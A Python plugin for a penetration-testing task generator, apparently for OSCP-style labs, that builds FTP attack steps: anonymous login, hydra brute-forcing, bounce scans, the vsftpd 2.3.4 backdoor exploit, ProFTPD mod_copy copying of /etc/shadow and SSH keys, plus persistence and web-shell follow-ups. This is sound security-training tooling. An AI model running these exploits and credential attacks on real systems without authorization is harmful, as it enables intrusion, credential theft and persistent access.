"""
FTP service enumeration plugin

Generates tasks for FTP enumeration including:
- Anonymous access testing
- Banner grabbing and version detection
- File enumeration and download
- Upload/writability testing
- Credential brute-forcing
- FTP bounce attack detection
- Config file discovery
- Version-specific exploits

Extracted from HackTricks: pentesting-ftp/README.md, ftp-bounce-attack.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class FTPPlugin(ServicePlugin):
    """FTP enumeration plugin"""

    @property
    def name(self) -> str:
        return "ftp"

    @property
    def default_ports(self) -> List[int]:
        return [21]

    @property
    def service_names(self) -> List[str]:
        return ['ftp', 'ftps', 'ftp-data']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect FTP services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate FTP enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')

        tasks = {
            'id': f'ftp-enum-{port}',
            'name': f'FTP Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Banner Grabbing
        tasks['children'].append({
            'id': f'ftp-banner-{port}',
            'name': 'Banner Grabbing',
            'type': 'command',
            'metadata': {
                'command': f'nc -vn {target} {port}',
                'description': 'Grab FTP banner to identify service version and check if FTP is running',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    '-v': 'Verbose output (show connection details)',
                    '-n': 'No DNS resolution (faster, direct IP connection)',
                    f'{port}': 'Target FTP port (standard is 21)'
                },
                'success_indicators': [
                    'FTP banner displayed (e.g., "220 FTP Server ready")',
                    'Version information revealed',
                    'Server type identified (vsftpd, ProFTPD, FileZilla, etc.)'
                ],
                'failure_indicators': [
                    'Connection refused (port closed or firewall)',
                    'Connection timeout (host unreachable)',
                    'No banner displayed (non-standard FTP)'
                ],
                'next_steps': [
                    'Note exact version for exploit research',
                    'Test anonymous login if banner allows',
                    'Search version in searchsploit and CVE databases'
                ],
                'alternatives': [
                    f'telnet {target} {port}',
                    f'nmap -sV -p{port} {target} --script banner',
                    f'openssl s_client -connect {target}:{port} -starttls ftp  # For FTPS/TLS'
                ],
                'notes': 'FTP banners often leak useful version info. Some servers hide versions (220 FTP Server ready). Time estimate: 10 seconds.',
                'time_estimate': '10 seconds'
            }
        })

        # TASK 2: TLS Certificate Grab (if FTPS detected)
        if 'ftps' in service_info.get('service', '').lower() or port in [990, 989]:
            tasks['children'].append({
                'id': f'ftp-cert-{port}',
                'name': 'TLS Certificate Grab',
                'type': 'command',
                'metadata': {
                    'command': f'openssl s_client -connect {target}:{port} -starttls ftp',
                    'description': 'Grab TLS certificate from FTPS server (may reveal hostnames, organization info)',
                    'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                    'flag_explanations': {
                        's_client': 'OpenSSL SSL/TLS client',
                        '-connect': 'Target server and port',
                        '-starttls ftp': 'Upgrade connection to TLS using STARTTLS (explicit FTPS)'
                    },
                    'success_indicators': [
                        'Certificate displayed',
                        'Subject field shows domain/organization',
                        'Alternative names reveal other hosts'
                    ],
                    'failure_indicators': [
                        'Connection refused',
                        'SSL handshake failure',
                        'STARTTLS not supported'
                    ],
                    'next_steps': [
                        'Extract hostnames from certificate for DNS enum',
                        'Check certificate validity dates',
                        'Note organization info for social engineering'
                    ],
                    'alternatives': [
                        f'nmap --script ssl-cert -p{port} {target}'
                    ],
                    'notes': 'Explicit FTPS (port 21, upgrade to TLS) vs Implicit FTPS (port 990, TLS from start). Use openssl for explicit, direct TLS for implicit.'
                }
            })

        # TASK 3: Anonymous Access Test (CRITICAL QUICK WIN)
        tasks['children'].append({
            'id': f'ftp-anon-{port}',
            'name': 'Anonymous Access Test',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script ftp-anon -p{port} {target}',
                'description': 'Test for anonymous FTP login (username: anonymous, password: anonymous or blank)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    '--script ftp-anon': 'NSE script to test anonymous FTP access and list directory contents',
                    f'-p{port}': f'Target FTP port {port}'
                },
                'success_indicators': [
                    'Anonymous FTP login allowed',
                    'Directory listing retrieved',
                    '230 Login successful',
                    'Files and directories visible'
                ],
                'failure_indicators': [
                    '530 Login incorrect',
                    '530 Anonymous access denied',
                    'Connection refused',
                    '421 Service not available'
                ],
                'next_steps': [
                    'If successful: Download all files with wget -m ftp://anonymous:anonymous@{target}',
                    'Check for sensitive files (configs, backups, credentials)',
                    'Test write permissions (upload test file)',
                    'If failed: Attempt credential brute-force'
                ],
                'alternatives': [
                    f'ftp {target}  # Interactive: username=anonymous, password=anonymous',
                    f'wget -r ftp://anonymous:anonymous@{target}  # Recursive download',
                    f'lftp -u anonymous,anonymous {target}  # Modern FTP client',
                    f'curl -u anonymous:anonymous ftp://{target}/ --list-only  # List files'
                ],
                'notes': 'Anonymous FTP still common in legacy systems, IoT devices, backup servers. Often a QUICK WIN. Try credentials: anonymous:anonymous, anonymous:, ftp:ftp. Time estimate: 30 seconds.',
                'time_estimate': '30 seconds'
            }
        })

        # TASK 4: FTP Command Enumeration
        tasks['children'].append({
            'id': f'ftp-commands-{port}',
            'name': 'FTP Command Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Enumerate supported FTP commands using HELP and FEAT (reveals server capabilities)',
                'tags': ['MANUAL', 'OSCP:MEDIUM', 'QUICK_WIN'],
                'notes': f'''
Connect and enumerate FTP commands:
  nc -vn {target} {port}

After connection:
  HELP            # List all supported FTP commands
  FEAT            # List extended features (AUTH TLS, MLST, UTF8, etc.)
  STAT            # Server status and configuration info
  SYST            # Operating system type

Key commands to check:
  - HELP: Shows available commands (VRFY, EXPN for user enum)
  - FEAT: Extended features (TLS support, UTF-8, passive mode)
  - STAT: Version, config, sometimes reveals paths
  - SYST: OS type (UNIX, Windows, helps with exploit selection)

Example output:
  214-The following commands are recognized:
  214-USER PASS CWD XCWD CDUP XCUP QUIT PORT PASV EPRT EPSV
  214-RETR STOR LIST NLST HELP SITE ...

  211-Features:
  211 AUTH TLS, PBSZ, PROT, UTF8, MLST

Time estimate: 1-2 minutes
''',
                'success_indicators': [
                    'Command list retrieved',
                    'Features listed',
                    'System type identified'
                ],
                'failure_indicators': [
                    'HELP command not supported',
                    'Server hangs after connection',
                    'Commands disabled'
                ],
                'next_steps': [
                    'Note if TLS/SSL supported (AUTH TLS in FEAT)',
                    'Check for PORT command (FTP bounce attack)',
                    'Note OS type for exploit selection'
                ]
            }
        })

        # TASK 5: Automated FTP Script Scan
        tasks['children'].append({
            'id': f'ftp-scripts-{port}',
            'name': 'Automated FTP Script Scan',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script ftp-* -p{port} {target}',
                'description': 'Run all FTP NSE scripts (anonymous login, bounce attack, brute-force, backdoor detection)',
                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                'flag_explanations': {
                    '--script ftp-*': 'Run all NSE scripts matching "ftp-*" (comprehensive FTP enumeration)',
                    f'-p{port}': f'Target FTP port {port}'
                },
                'success_indicators': [
                    'Multiple script results returned',
                    'Anonymous login status',
                    'Bounce attack vulnerability status',
                    'FTP capabilities discovered'
                ],
                'failure_indicators': [
                    'No scripts returned results',
                    'Connection timeout',
                    'Scripts blocked by firewall'
                ],
                'next_steps': [
                    'Review all script outputs for vulnerabilities',
                    'Test any vulnerabilities found (bounce, backdoor)',
                    'Document findings for report'
                ],
                'alternatives': [
                    f'nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p{port} {target}',
                    'Manual testing of each vulnerability type'
                ],
                'notes': 'Comprehensive but noisy. Includes: ftp-anon, ftp-bounce, ftp-brute, ftp-libopie, ftp-proftpd-backdoor, ftp-vsftpd-backdoor, ftp-vuln-cve2010-4221. Time estimate: 2-5 minutes.',
                'time_estimate': '2-5 minutes'
            }
        })

        # TASK 6: File Enumeration and Download
        tasks['children'].append({
            'id': f'ftp-download-{port}',
            'name': 'File Enumeration and Download',
            'type': 'parent',
            'children': [
                {
                    'id': f'ftp-list-files-{port}',
                    'name': 'List All Files (Including Hidden)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manually list all files and directories (including hidden files with dot prefix)',
                        'tags': ['MANUAL', 'OSCP:HIGH'],
                        'notes': f'''
Interactive FTP file operations (requires valid credentials or anonymous access):

Connect:
  ftp {target}
  Username: anonymous
  Password: anonymous

List files:
  ls -la              # List all files including hidden (Unix)
  dir                 # List files (Windows)
  ls -R               # Recursive list (all subdirectories)

Navigate:
  pwd                 # Print working directory
  cd <directory>      # Change directory
  cd ..               # Go up one level

Download single file:
  get <filename>      # Download file
  mget *.txt          # Download multiple files (wildcards)

Download mode:
  binary              # Set binary mode (for executables, images)
  ascii               # Set ASCII mode (for text files)

Test upload (writability):
  put <localfile>     # Upload file (tests if directory writable)

Exit:
  bye                 # Close connection

Automated recursive download:
  wget -m ftp://username:password@{target}
  wget -m --no-passive ftp://anonymous:anonymous@{target}  # If PASV disabled
  wget -r --user="USERNAME" --password="PASSWORD" ftp://{target}/

Time estimate: 5-10 minutes (depending on file count)
''',
                        'success_indicators': [
                            'Files and directories listed',
                            'Hidden files discovered',
                            'Sensitive files found (passwords, configs, backups)',
                            'Upload directory writable'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Directory empty',
                            'ls command hangs',
                            'Passive mode issues'
                        ],
                        'next_steps': [
                            'Download all files for offline analysis',
                            'Search for credentials in config files',
                            'Look for backup files (.bak, .old, ~)',
                            'Check for scripts (shell scripts, batch files)'
                        ]
                    }
                },
                {
                    'id': f'ftp-recursive-download-{port}',
                    'name': 'Recursive File Download',
                    'type': 'command',
                    'metadata': {
                        'command': f'wget -m ftp://anonymous:anonymous@{target}',
                        'description': 'Download ALL files recursively from FTP server (requires anonymous or valid credentials)',
                        'tags': ['OSCP:HIGH', 'AUTOMATED'],
                        'flag_explanations': {
                            '-m': 'Mirror mode (recursive download with infinite depth, timestamps)',
                            'ftp://user:pass@host': 'FTP URL with embedded credentials'
                        },
                        'success_indicators': [
                            'Files downloaded to local directory',
                            'Directory structure preserved',
                            'wget completes successfully'
                        ],
                        'failure_indicators': [
                            'Passive mode error (add --no-passive)',
                            'Authentication failed',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Grep downloaded files for passwords: grep -ri "password" .',
                            'Search for credentials: grep -ri "username" .',
                            'Find config files: find . -name "*.conf" -o -name "*.cfg"',
                            'Examine source code for hardcoded credentials'
                        ],
                        'alternatives': [
                            f'wget -m --no-passive ftp://anonymous:anonymous@{target}  # If PASV fails',
                            f'wget -r --user="USERNAME" --password="PASSWORD" ftp://{target}/',
                            f'lftp -e "mirror ; quit" -u anonymous,anonymous {target}',
                            'Manual: ftp {target}, then mget * for each directory'
                        ],
                        'notes': 'Large file downloads may take significant time. For OSCP exam: document file locations and contents. Use --limit-rate to avoid network saturation. Time estimate: 1-30 minutes (depends on file count/size).',
                        'time_estimate': '1-30 minutes (size-dependent)'
                    }
                }
            ]
        })

        # TASK 7: Credential Brute-force (fallback if anonymous fails)
        tasks['children'].append({
            'id': f'ftp-bruteforce-{port}',
            'name': 'Credential Brute-force',
            'type': 'parent',
            'children': [
                {
                    'id': f'ftp-default-creds-{port}',
                    'name': 'Test Default Credentials',
                    'type': 'command',
                    'metadata': {
                        'command': f'hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt {target} ftp',
                        'description': 'Test common default FTP credentials (admin:admin, root:root, ftp:ftp, etc.) - QUICK WIN before full brute-force',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-C': 'Colon-separated username:password list (format: user:pass per line)',
                            f'{target}': 'Target IP or hostname',
                            'ftp': 'Service type (FTP protocol)'
                        },
                        'success_indicators': [
                            'Valid credentials found',
                            '[21][ftp] host: X login: Y password: Z',
                            'Hydra reports success'
                        ],
                        'failure_indicators': [
                            'All attempts failed',
                            'Account lockout detected',
                            'Connection rate-limited',
                            'Too many login attempts error'
                        ],
                        'next_steps': [
                            'If creds found: Login with ftp {target}, enumerate files',
                            'Test same credentials on other services (SSH, SMB, RDP)',
                            'If all fail: Try full brute-force with hydra -L/-P'
                        ],
                        'alternatives': [
                            f'ncrack -p{port} --user admin --pass /usr/share/wordlists/rockyou.txt {target}',
                            f'medusa -h {target} -u admin -P /usr/share/wordlists/rockyou.txt -M ftp',
                            'Manual: ftp {target}, try admin/admin, root/toor, ftp/ftp'
                        ],
                        'notes': 'Default creds still work on IoT, legacy systems, lazy admins. SecLists has 64 FTP default creds. Try this BEFORE full brute-force (faster, less noisy). Time estimate: 1-2 minutes.',
                        'time_estimate': '1-2 minutes'
                    }
                },
                {
                    'id': f'ftp-bruteforce-full-{port}',
                    'name': 'Full Credential Brute-force',
                    'type': 'command',
                    'metadata': {
                        'command': f'hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 4 ftp://{target}',
                        'description': 'Full credential brute-force with wordlists (SLOW, NOISY - use only if other methods fail)',
                        'tags': ['OSCP:LOW', 'AUTOMATED', 'NOISY'],
                        'flag_explanations': {
                            '-L': 'Username wordlist (file with one username per line)',
                            '-P': 'Password wordlist (rockyou.txt = 14 million passwords)',
                            '-t 4': 'Parallel tasks/threads (4 = safe/slow, 16 = aggressive/noisy, 64 = very noisy)',
                            f'ftp://{target}': 'Target protocol and host'
                        },
                        'success_indicators': [
                            'Valid credentials found',
                            '[21][ftp] host: X login: Y password: Z',
                            'Hydra completes with success message'
                        ],
                        'failure_indicators': [
                            'All attempts failed',
                            'Account lockout triggered',
                            'Connection rate-limited',
                            'Too many authentication failures',
                            'Host blocks your IP'
                        ],
                        'next_steps': [
                            'If creds found: Login and enumerate files',
                            'Test credentials on other services (credential reuse)',
                            'If failed: Consider password spraying (one password, many users)'
                        ],
                        'alternatives': [
                            f'medusa -h {target} -U users.txt -P passwords.txt -M ftp -t 4',
                            f'ncrack -p{port} -U users.txt -P passwords.txt {target}',
                            f'patator ftp_login host={target} user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg="Login incorrect"',
                            'Manual: ftp {target}, try each user/pass combination'
                        ],
                        'notes': 'FTP brute-force is SLOW (plain text, sequential auth). Use small wordlists for OSCP exam (time-limited). Increase threads (-t 16) for faster results (more noisy). Often triggers lockout. Try default creds and known passwords first. Time estimate: 30 minutes to several hours (depends on wordlist size).',
                        'time_estimate': '30+ minutes (wordlist-dependent)',
                        # Phase 4: Wordlist selection metadata
                        'wordlist_purpose': 'password-cracking'
                    }
                }
            ]
        })

        # TASK 8: FTP Bounce Attack Detection
        tasks['children'].append({
            'id': f'ftp-bounce-{port}',
            'name': 'FTP Bounce Attack Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'ftp-bounce-nmap-{port}',
                    'name': 'Automated Bounce Detection',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -Pn -v -p 21,80 -b anonymous:anonymous@{target} 127.0.0.1',
                        'description': 'Test if FTP server allows PORT command (bounce attack) to scan other hosts/ports',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'flag_explanations': {
                            '-Pn': 'No ping (treat host as online)',
                            '-v': 'Verbose output',
                            '-p 21,80': 'Ports to scan on victim (via FTP bounce)',
                            '-b user:pass@ftp': 'Bounce scan through FTP server (proxy)',
                            '127.0.0.1': 'Victim to scan (FTP server scans itself or internal network)'
                        },
                        'success_indicators': [
                            'Bounce scan succeeds',
                            'Port states returned',
                            'FTP server proxies scan to target'
                        ],
                        'failure_indicators': [
                            'Bounce scan failed (PORT command disabled)',
                            'FTP server rejects PORT command',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'If bounce works: Scan internal network via FTP server',
                            'Use FTP server to bypass firewall rules',
                            'Scan victim hosts that block your IP'
                        ],
                        'alternatives': [
                            'Manual bounce test: nc {target} 21, USER anonymous, PASS anonymous, PORT 127,0,0,1,0,80, LIST',
                            'Manual: Use EPRT command for IPv6 bounce attacks'
                        ],
                        'notes': 'FTP bounce attacks are RARE on modern servers (PORT command disabled). Allows scanning internal networks, bypassing firewalls. Useful when FTP server has more network access than you. Time estimate: 2-5 minutes.',
                        'time_estimate': '2-5 minutes'
                    }
                },
                {
                    'id': f'ftp-bounce-manual-{port}',
                    'name': 'Manual Bounce Attack Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manually test FTP bounce attack using PORT/EPRT commands',
                        'tags': ['MANUAL', 'OSCP:LOW', 'ADVANCED'],
                        'notes': f'''
Manual FTP Bounce Attack (scan port 8080 on 172.32.80.80):

1. Connect to vulnerable FTP:
   nc -vn {target} {port}

2. Authenticate:
   USER anonymous
   PASS anonymous

3. Use PORT command to target IP:Port:
   PORT 172,32,80,80,0,8080
   (Format: IP address with commas, then port as two bytes)
   Port calculation: 0,8080 = (0 * 256) + 8080 = 8080

4. Send LIST command:
   LIST

5. Check response:
   - 150 File status okay = Port 8080 is OPEN
   - 425 No connection established = Port 8080 is CLOSED

Alternative: EPRT command (supports IPv6):
   EPRT |2|172.32.80.80|8080|
   (|2| = TCP, |1| would be UDP)
   LIST

Use cases:
- Scan internal network from FTP server perspective
- Bypass firewall rules (FTP server has more access)
- Port scan hosts that block your IP
- Abuse FTP server to attack other services

Port encoding examples:
- Port 80:    0,80
- Port 443:   1,187  (443 = 1*256 + 187)
- Port 8080:  31,144 (8080 = 31*256 + 144)
- Port 445:   1,189  (445 = 1*256 + 189)

Time estimate: 5-10 minutes
''',
                        'success_indicators': [
                            '150 File status okay (port open)',
                            'FTP server connects to target',
                            'Data received from target'
                        ],
                        'failure_indicators': [
                            '425 No connection established (port closed)',
                            '500 PORT command disabled',
                            'Illegal PORT command'
                        ],
                        'next_steps': [
                            'Scan all internal IPs via FTP server',
                            'Map internal network from FTP perspective',
                            'Look for internal services (MySQL, RDP, SMB)'
                        ]
                    }
                }
            ]
        })

        # TASK 9: Config File Discovery (Post-Exploitation)
        tasks['children'].append({
            'id': f'ftp-config-{port}',
            'name': 'FTP Config File Discovery',
            'type': 'manual',
            'metadata': {
                'description': 'Locate FTP server config files (post-exploitation - requires shell access)',
                'tags': ['MANUAL', 'OSCP:MEDIUM', 'POST_EXPLOIT'],
                'notes': '''
FTP Configuration Files (requires shell access on FTP server):

Common locations:
  /etc/vsftpd.conf          # vsftpd (most common Linux FTP)
  /etc/vsftpd/vsftpd.conf
  /etc/proftpd/proftpd.conf # ProFTPD
  /etc/ftpusers             # List of denied users
  /etc/ftp.conf             # Generic FTP config

Config settings to look for:
  anonymous_enable=YES         # Anonymous login enabled
  anon_upload_enable=YES       # Anonymous can upload
  anon_mkdir_write_enable=YES  # Anonymous can create dirs
  anon_root=/home/username/ftp # Anonymous root directory
  chown_uploads=YES            # Change ownership of uploaded files
  local_enable=YES             # Local users can login
  write_enable=YES             # Write commands enabled (STOR, DELE, RMD)
  no_anon_password=YES         # No password required for anonymous

Search for configs:
  find / -name vsftpd.conf 2>/dev/null
  find / -name proftpd.conf 2>/dev/null
  find / -name "ftp*.conf" 2>/dev/null
  locate vsftpd.conf

Exploitation:
  - If anon_upload_enable=YES: Upload malicious files
  - If write_enable=YES: Modify existing files
  - If chown_username=root: Uploaded files owned by root
  - Check anon_root for sensitive files

Time estimate: 5 minutes (if you have shell)
''',
                'success_indicators': [
                    'Config file found and readable',
                    'Dangerous settings identified',
                    'Upload/write permissions enabled'
                ],
                'failure_indicators': [
                    'Config files not readable',
                    'No shell access',
                    'Config files not in standard locations'
                ],
                'next_steps': [
                    'If anon_upload enabled: Upload web shell, reverse shell',
                    'If write enabled: Modify files for persistence',
                    'Check anon_root directory for sensitive data'
                ]
            }
        })

        # TASK 10: Version-Specific Exploits
        if version:
            # vsftpd 2.3.4 Backdoor (CRITICAL)
            if 'vsftpd' in version.lower() and '2.3.4' in version:
                tasks['children'].append({
                    'id': f'vsftpd-backdoor-{port}',
                    'name': 'vsftpd 2.3.4 Backdoor Exploit',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'vsftpd-msf-{port}',
                            'name': 'Metasploit Exploit',
                            'type': 'command',
                            'metadata': {
                                'command': f'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {target}; set RPORT {port}; exploit"',
                                'description': 'Exploit vsftpd 2.3.4 backdoor (smiley face backdoor) - INSTANT ROOT SHELL',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                                'flag_explanations': {
                                    '-q': 'Quiet mode (suppress banner)',
                                    '-x': 'Execute commands after startup',
                                    'use exploit/unix/ftp/vsftpd_234_backdoor': 'Load vsftpd backdoor exploit module',
                                    'set RHOST': 'Set target IP',
                                    'set RPORT': 'Set target FTP port',
                                    'exploit': 'Run the exploit'
                                },
                                'success_indicators': [
                                    'Command shell session opened',
                                    'Root shell obtained',
                                    'uid=0(root) in output',
                                    'Backdoor triggered successfully'
                                ],
                                'failure_indicators': [
                                    'Exploit failed',
                                    'Backdoor not present (patched version)',
                                    'Connection refused on port 6200',
                                    'No session created'
                                ],
                                'next_steps': [
                                    'If root shell: Capture flags, enumerate system',
                                    'Establish persistence (add SSH key, cron job)',
                                    'Dump credentials (/etc/shadow)',
                                    'If failed: Check if backdoor compiled in (some vsftpd 2.3.4 are clean)'
                                ],
                                'alternatives': [
                                    'Manual: telnet {target} 21, login as "user:)" to trigger backdoor, then nc {target} 6200',
                                    'Python script: vsftpd_234_exploit.py (searchsploit)',
                                    'Manual verification: Check if port 6200 opens after login with smiley face'
                                ],
                                'notes': 'This backdoor was INTENTIONALLY INSERTED in vsftpd source code (2011). Attacker logs in with username ending in ":)" smiley, backdoor opens shell on port 6200. Instant root if present. Famous in OSCP labs. Time estimate: 30 seconds - 1 minute.',
                                'time_estimate': '30 seconds - 1 minute'
                            }
                        },
                        {
                            'id': f'vsftpd-manual-{port}',
                            'name': 'Manual Backdoor Trigger',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Manually trigger vsftpd 2.3.4 backdoor without Metasploit',
                                'tags': ['MANUAL', 'OSCP:HIGH', 'EXPLOIT'],
                                'notes': f'''
Manual vsftpd 2.3.4 Backdoor Exploitation:

1. Trigger the backdoor:
   telnet {target} {port}

   When prompted for username:
   USER backdoored:)
   (The ":)" smiley face triggers backdoor)

   PASS anything

2. Connect to backdoor shell (port 6200):
   nc -nv {target} 6200

   If successful, you get ROOT SHELL (uid=0)

3. Verify:
   id
   whoami

Explanation:
- Backdoor inserted in vsftpd 2.3.4 source (July 2011)
- Username ending in ":)" triggers backdoor
- Opens shell on port 6200 as root
- No authentication needed for backdoor port

Alternative trigger usernames:
  user:)
  anonymous:)
  admin:)

If backdoor present:
- Port 6200 opens after trigger
- Direct root shell access
- No password needed
- Game over for target

OSCP tip: This is a QUICK WIN. Try immediately if you see vsftpd 2.3.4. Document exact commands for report.

Time estimate: 1 minute
''',
                                'success_indicators': [
                                    'Port 6200 opens after trigger',
                                    'Shell access on port 6200',
                                    'Root shell (uid=0)',
                                    'Commands execute successfully'
                                ],
                                'failure_indicators': [
                                    'Port 6200 does not open',
                                    'Connection refused on 6200',
                                    'Backdoor not compiled in (clean build)',
                                    'Patched version'
                                ],
                                'next_steps': [
                                    'Upgrade to full TTY: python -c "import pty; pty.spawn(\'/bin/bash\')"',
                                    'Capture flags',
                                    'Dump /etc/shadow',
                                    'Add SSH key for persistence'
                                ]
                            }
                        }
                    ]
                })

            # ProFTPd Exploits
            if 'proftpd' in product.lower() or 'proftpd' in version.lower():
                tasks['children'].append({
                    'id': f'proftpd-exploits-{port}',
                    'name': f'ProFTPD Exploit Research: {version}',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'searchsploit-proftpd-{port}',
                            'name': f'SearchSploit: ProFTPD',
                            'type': 'command',
                            'metadata': {
                                'command': f'searchsploit proftpd',
                                'description': 'Search ExploitDB for ProFTPD vulnerabilities (multiple RCE, SQLi, directory traversal exploits)',
                                'tags': ['OSCP:HIGH', 'RESEARCH'],
                                'notes': '''
Known ProFTPD Vulnerabilities:
- ProFTPd 1.3.3c: Backdoor (similar to vsftpd)
- ProFTPd 1.3.5: mod_copy RCE (SITE CPFR/CPTO arbitrary file copy)
- ProFTPd < 1.3.3c: Multiple buffer overflows
- ProFTPd 1.2.x: SQL injection (mod_sql)

searchsploit will show CVEs and local exploit paths.
'''
                            }
                        },
                        {
                            'id': f'proftpd-modcopy-{port}',
                            'name': 'ProFTPD mod_copy Exploit (1.3.5)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Test ProFTPD mod_copy vulnerability (unauthenticated arbitrary file copy)',
                                'tags': ['MANUAL', 'OSCP:HIGH', 'EXPLOIT'],
                                'notes': f'''
ProFTPD 1.3.5 mod_copy RCE:

Vulnerability: Unauthenticated SITE CPFR/CPTO commands allow arbitrary file copy

Exploit:
1. Connect to FTP:
   nc {target} {port}

2. Copy sensitive file to web root:
   SITE CPFR /etc/passwd
   SITE CPTO /var/www/html/passwd.txt

3. Access via HTTP:
   curl http://{target}/passwd.txt

Exploitation scenarios:
- Copy /etc/passwd, /etc/shadow to web root
- Copy SSH private keys to accessible location
- Copy web config files (database credentials)
- Overwrite files with malicious versions

Example: Copy authorized_keys:
  SITE CPFR /root/.ssh/id_rsa
  SITE CPTO /tmp/id_rsa

CVE: CVE-2015-3306

Time estimate: 2-5 minutes
'''
                            }
                        }
                    ]
                })

            # Generic Exploit Research for any version
            tasks['children'].append({
                'id': f'exploit-research-ftp-{port}',
                'name': f'Exploit Research: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-ftp-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit {version}',
                            'description': 'Search ExploitDB for known FTP vulnerabilities matching this version',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'notes': 'Search both version number AND product name (e.g., searchsploit vsftpd 2.3.4). Review all results for RCE, privilege escalation, authentication bypass.'
                        }
                    },
                    {
                        'id': f'cve-lookup-ftp-{port}',
                        'name': f'CVE Lookup: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'crack cve-lookup "{version}"',
                            'description': 'Search CVE databases for this FTP version',
                            'tags': ['RESEARCH'],
                            'notes': 'Cross-reference searchsploit with CVE databases. Look for: RCE, authentication bypass, directory traversal, buffer overflow.'
                        }
                    }
                ]
            })

        return tasks
